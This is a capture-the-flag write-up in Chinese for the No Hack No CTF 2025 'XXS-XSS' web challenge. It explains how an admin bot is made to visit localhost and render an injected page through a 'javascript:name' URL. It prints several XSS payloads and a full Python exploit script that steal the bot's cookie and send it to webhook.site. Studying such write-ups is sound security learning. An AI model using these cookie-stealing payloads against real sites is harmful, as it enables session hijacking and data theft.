##### tags: `NoHackNoCTF_2025`
# No Hack No CTF 2025 Web : XXS-XSS

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/rJAufsIBgx.png)

## <span class="red">解題過程(After Event)</span>

1. **初看感覺又是一題要偷 admin bot 手中的 cookie flag 的 XSS 題。但是仔細 CR(code review) 會發現細節不太一樣，這題需要讓 bot 想辦法造訪 (visit) 到 `/` 根目錄 (`request.remote_addr` 限定要以 `127.0.0.1` 的域名發送的請求)，才能拿到有 flag 的 `index.html`**

- **`/visit` 底下：**
    - ![image](https://hackmd.io/_uploads/r1G-hEbUge.png)

- **`/` (根目錄)底下：**
    - ![image](https://hackmd.io/_uploads/r12Ih4bUgl.png)

&emsp;

2. **接著看 `index.html` 的邏輯為何<span class="blue">(註解是我自己標的)</span>。看起來相對簡單，重點應該是放在 `window.location.href` 這個 html 屬性上面，如果能夠<span class="red">聯合剛剛拿到的 cookie flag (也就是 flask 的回應物件)</span> ，並且<span class="red">成功進入 if 判斷式</span>內，就能夠藉由 `window.location.href` 將 cookie flag 送到 `webhook.site`**

- ![image](https://hackmd.io/_uploads/r1YSREWUxx.png)

&emsp;

3. **因此，任務可以大概分成：**
    - (1) **想辦法讓 bot 造訪到根目錄，從而造訪有 cookie flag 的 `index.html`**
    - (2) **在拿到該 flask 的回應物件之後，想辦法造出<span class="red">長度小於 15 的 url</span> 偷取 cookie**

- **但是在這之前，這題還有兩道關卡，分別是<span class="red">請求 url 限制</span>和<span class="red">找 nonce 的挑戰</span>，找 nonce 挑戰的目的應該是為了避免一次送多個請求**

- **`/get_challenge` 的實作**
    - ![image](https://hackmd.io/_uploads/Hk2iXBZIlx.png)

- **`/visit` 底下關於 url 和 nonce 的詳細限制**
    - ![image](https://hackmd.io/_uploads/HypI4rZIel.png)

&emsp;

4. **針對 <span class="blue">nonce 挑戰</span>的部分，題目有附一個 solver ，我稍微改動了一下讓 script 可以直接用。另外關於造訪根目錄，可以<span class="red">直接向 `http://localhost:5000/` 發送請求</span>並在後方直接加上 `URL query string` 就能夠拿到 flask 的回應物件 (cookie flag) 
(因為<span class="red">這個 instance 就是跑在 port 5000 上</span>)**

- **目前 payload 的骨架：**
    ```python=
    import requests
    import json
    import urllib.parse
    from solve_pow import solve_pow


    url = "http://chal.78727867.xyz:21337"

    # must create session to retain cookie
    s = requests.Session()

    # get the challenge nonce 
    chal_response = s.get(url = f'{url}/get_challenge')
    data = json.loads(chal_response.text)
    nonce = solve_pow(data["challenge"])

    relay_url = f'http://localhost:5000/?url=...&name=...'
    encoded_relay_url = urllib.parse.quote(relay_url)

    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    ```

- **題目給的 `solver` ：**
    - ![image](https://hackmd.io/_uploads/B1izdHbLge.png)

- **針對 step 3 part (1) 的 script ：**
    - ![image](https://hackmd.io/_uploads/rJDNvB-8lx.png)

- **`app.py` 跑在 5000 上：**
    - ![image](https://hackmd.io/_uploads/rktMG8bUgl.png)

&emsp;

5. **處理完 step 3 part (1) 後，接下來要處理的就是 step 3 part (2) ，也是本題的重點——如何<span class="red">在 url 長度 ${\le15}$ 的限制</span>之內把 cookie flag 送到 `webhook.site` ，在比賽中我想過很多相關的 url payload ，例如：**

    ```python=
    payload = f'data:text/html,<script>location="{webhook}/?c="+document.cookie</script>'
    encoded_payload = urllib.parse.quote(payload)

    relay_url = f'http://localhost:5000/?url={encoded_payload}'
    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    ```
- **或是：**

    ```python=
    payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'
    encoded_payload = urllib.parse.quote(payload)

    relay_url = f'http://localhost:5000/?url={encoded_payload}'
    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    ```

- **但是很明顯這些 payload 的長度都超過 15 了，直接塞到 url 這個 query string 行不通，但是注入 name 這個 query string 也不行，因為前端對 name 的存取方式用的是 `.textContent` ，所以沒辦法塞入任何 JS code**
    - ![image](https://hackmd.io/_uploads/ryNLn4M8lx.png)

&emsp;

6. **所以這裡就要利用到 URL scheme 中 `javascript:` 的特殊效果，如果在 `javascript:` 後面直接接上可控的 `variable name` ， `window.location.href = "javascript:name";` 就能夠做到<span class="red">把這個 `variable name` 的值當成一個新的 HTML 的頁面內容進行渲染</span>。這時候看似無法進行注入的 name 就可以派上用場了**

- **[MDN link (About javascript:)](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/javascript)**

- **完整的 pwned script ：**

    ```python=
    import requests
    import json
    import urllib.parse
    from solve_pow import solve_pow


    url = "http://chal.78727867.xyz:21337"

    # must create session to retain cookie
    s = requests.Session()

    # get the challenge nonce 
    chal_response = s.get(url = f'{url}/get_challenge')
    data = json.loads(chal_response.text)
    nonce = solve_pow(data["challenge"])

    payload = f'<img src=x onerror="location.href=`{webhook}/?c=`+btoa(document.cookie)">'
    encoded_payload = urllib.parse.quote(payload)

    relay_url = f'http://localhost:5000/?url="javascript:name"&name={encoded_payload}'
    encoded_relay_url = urllib.parse.quote(relay_url)

    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    
    # make sure the request has been made
    print("payload HTTP status code :", payload_response.status_code)
    print("payload message :", payload_response.text)
    ```

- ![image](https://hackmd.io/_uploads/HJrUq4ZUex.png)

- ![image](https://hackmd.io/_uploads/SyrudV-Llx.png)

- ![image](https://hackmd.io/_uploads/rk_69NZUlx.png)

- ![image](https://hackmd.io/_uploads/rkqF5EW8le.png)

- **flag🚩 :`NHNC{javascript:xssed!&xssed!=alert(/whale/)}`**

&emsp;

## <span class="red">心得</span>

1. **我在測試過程中遇到的第一個問題。我一開始把 name 直接接在最外層 url 和 nonce 中間，就像是底下這樣，但是這會導致在第一次送資料給 bot 時， name 這個 key 會直接被 dropped ，導致後續 name 是空的**
    ```python=
    payload_response = s.get(url = f'{url}/visit?url=...&name=...&nonce=...')
    ```
    - ![image](https://hackmd.io/_uploads/SyU9EV-8lg.png)
    - ![image](https://hackmd.io/_uploads/BJdxHSzLxg.png)

&emsp;

2. **經過第一個問題後，我知道要把 name 塞到給 bot 的 url 裡面了，像是：**

    ```python=
    payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'

    relay_url = f'http://localhost:5000/?url={trigger}&name={payload}'
    encoded_relay_url = urllib.parse.quote(relay_url)

    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    ```
    - **結果我在 `webhook.site` 還是沒有發現 cookie ，回去檢查後端回顯(自己額外加的)才發現第二層 url 也要自己做一次 URL Encode**
    - ![image](https://hackmd.io/_uploads/ryzDw4-8el.png)
    ```python=
    payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'
    encoded_payload = urllib.parse.quote(payload)

    relay_url = f'http://localhost:5000/?url={trigger}&name={encoded_payload}'
    encoded_relay_url = urllib.parse.quote(relay_url)

    payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonce}')
    ```

&emsp;
    
3. **step 5 裡面的 payload 塞進 name 也可以動!!**

- `payload = f'data:text/html,<script>location="{webhook}/?c="+document.cookie</script>'`
    - **cookie 沒有做 base64 可能會在 decode 時被 browser 誤解**
    - ![image](https://hackmd.io/_uploads/ByDO_rGUxl.png)

- ```payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'```
    - ![image](https://hackmd.io/_uploads/S1P4trfLge.png)
    - ![image](https://hackmd.io/_uploads/HJxUYHGLxx.png)
